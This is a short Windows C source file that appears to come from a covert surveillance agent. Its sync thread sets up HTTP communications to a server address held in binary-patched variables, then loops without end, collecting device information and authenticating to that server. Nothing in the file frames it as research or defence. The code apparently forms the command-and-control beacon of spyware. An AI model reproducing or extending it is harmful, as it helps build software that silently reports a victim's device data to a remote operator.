#include <Windows.h>

#include "sync_thread.h"
#include "binpatched_vars.h"
#include "device_agent.h"
#include "log_files.h"
#include "win_http.h"
#include "md5.h"
//#include "sha1.h"
#include "proto.h"

BYTE pConfKey[16];
BYTE pClientKey[16];
BYTE pInstanceId[20];


VOID SyncThreadFunction()
{
	CreateLogFile(0x41414141, NULL, 0);
	InitializeCommunications();
	while(1)
	{
		Sleep(SYNC_INTERVAL);
#ifdef _DEBUG
		OutputDebugString(L"[*] Starting sync...\n");
#endif
		GetDeviceInfo();
		ProtoAuthenticate();


	}
}


VOID InitializeCommunications()
{
	ULONG pServerPort;
	BYTE pServerIp[32];

	//GetUserUniqueHash(pInstanceId, sizeof(pInstanceId));
	WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort);
}


